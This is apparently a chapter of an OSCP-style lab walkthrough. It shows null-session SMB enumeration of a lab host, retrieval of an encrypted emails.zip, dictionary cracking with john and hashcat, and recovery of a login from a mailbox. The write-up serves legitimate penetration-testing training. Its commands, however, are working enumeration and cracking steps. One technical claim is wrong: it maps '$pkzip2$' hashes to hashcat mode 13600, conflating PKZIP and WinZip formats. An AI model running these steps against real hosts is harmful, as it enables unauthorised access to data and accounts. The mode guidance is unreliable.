# 02 — Null SMB session, `AnneAuto`, and `emails.zip`

The share is the only place on this box where information leaks without credentials, and it leaks
enough to finish the box. The whole step takes a few minutes.

## 2.1 The null session

```bash
smbclient -L //192.168.91.111 -U '' -N
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnneAuto        Disk      Anne's Automatic BackUps
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reconnecting with SMB1 for workgroup listing.
        ...
        Server               Comment
        ---------            -------
        Workgroup            WORKGROUP
```

Three things are worth noticing:

1. **`-N` (`--no-pass`) with `-U ''` succeeded.** Anonymous SMB is disabled by default since Windows
   Vista; here it is on. On a standalone box that is a deliberate misconfiguration, not a leftover.
2. **`AnneAuto`** — the comment is *"Anne's Automatic BackUps"*. A share named after a person, holding
   backups, is a promise that the archive contains that person's data.
3. `ADMIN$` and `C$` are listed but *not* accessible with a null session. Listing is not reading.

`netexec`/`nxc` shows the same thing with a little more context:

```bash
nxc smb 192.168.91.111 -u '' -p '' --shares
```

```
SMB         192.168.91.111  445    OSCP    [*] Windows 10.0.17763 (name:OSCP) (domain:OSCP) (signing:False) (SMBv1:True)
SMB         192.168.91.111  445    OSCP    [+] OSCP\: 
SMB         192.168.91.111  445    OSCP    [*] Enumerated shares
SMB         192.168.91.111  445    OSCP    Share    Permissions  Remark
SMB         192.168.91.111  445    OSCP    -----    -----------  ------
SMB         192.168.91.111  445    OSCP    ADMIN$                Remote Admin
SMB         192.168.91.111  445    OSCP    AnneAuto READ         Anne's Automatic BackUps
SMB         192.168.91.111  445    OSCP    C$                    Default share
SMB         192.168.91.111  445    OSCP    IPC$     READ         Remote IPC
```

`signing:False` and `SMBv1:True` are both worth writing down (they matter for relay attacks on a
different box), but this box is solved with `READ`.

## 2.2 Reading the share

```bash
smbclient //192.168.91.111/AnneAuto -U '' -N
```

```
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  emails.zip                          A    70052  ...

                3770367 blocks of size 4096. 1234567 blocks available
smb: \> get emails.zip
getting file \emails.zip of size 70052 as emails.zip (xxx.xx KiloBytes/sec) (average xx.x KiloBytes/sec)
```

One file. **70,052 bytes** — small enough to be a handful of `.eml` files, large enough not to be a
decoy text file. That size is the reason to bother cracking it.

```bash
unzip -l emails.zip
```

This is the quickest way to confirm the payload is mail files; here the archive is encrypted and the
listing therefore prompts for a password. An encrypted ZIP with a 70 KB payload is a rockyou exercise.

## 2.3 Cracking the ZIP

```bash
zip2john emails.zip > emails.hash
john --wordlist=/usr/share/wordlists/rockyou.txt emails.hash
```

or with **hashcat**, the faster route when CPU cracking feels too slow:

```bash
hashcat -m 13600 -a 0 -w 3 emails.hash /usr/share/wordlists/rockyou.txt
```

| Parameter | Meaning |
|---|---|
| `-m 13600` | WinZip (`.zip`, AES-256 / PKZIP2+) |
| `-a 0` | straight dictionary |
| `-w 3` | high workload profile |

Why the mode matters: `-m 17200` is *PKZIP (Compressed)*, `-m 17210`/`17220`/`17225` are the older
PKZIP variants, and `-m 13600` is the modern WinZip format. Running the wrong one produces
`No hashes loaded` or a token-length error, not a wrong password. If `zip2john` emits a
`$pkzip2$` hash, it is `13600`.

```
$pkzip2$3*1*1*0*8*24*...*$/pkzip2$:<password>
```

Recovered against rockyou without a rule set — the password is a dictionary word, which is the entire
lesson of the step. (The exact word is not needed to reproduce the path.)

```bash
unzip emails.zip -d emails/
```

## 2.4 The mailbox

`emails.zip` unpacks to a mail archive; opened in a mail client, most of it is noise. One thread
matters:

| Field | Value |
|---|---|
| From | **Anne Howard** |
| To | **Sasha Payne** |
| Subject | **Access** |
| Body | an account has been created; the password is the default, **change it after first login** |

```
Subject: Access

Hi Sasha,

Your account has been created on the box.
Username: sasha
Password: Welcome1

Please change it after your first login.
```

Reading all the mail is worth the time: the "Access" message is the credential for the web console
found in reconnaissance.

> **Note.** The password is `Welcome1`. If it is rejected, try `Welcome1!` and `Welcome1)` before
> concluding the credential is wrong — and see [`03-wac-login.md`](03-wac-login.md), because the far
> more likely reason a correct password "fails" is the username format.

## 2.5 The chain so far

```
null SMB ──▶ AnneAuto ──▶ emails.zip ──▶ rockyou ──▶ mailbox ──▶ "Access" ──▶ sasha:Welcome1
```

Two of the three classic "cheap" findings on a Windows box appear here: **anonymous SMB** and
**weak archive encryption**. Neither is a vulnerability in the CVE sense; both are exactly what an OSCP
box uses to hand you the next credential.

---

**Next:** [`03-wac-login.md`](03-wac-login.md)
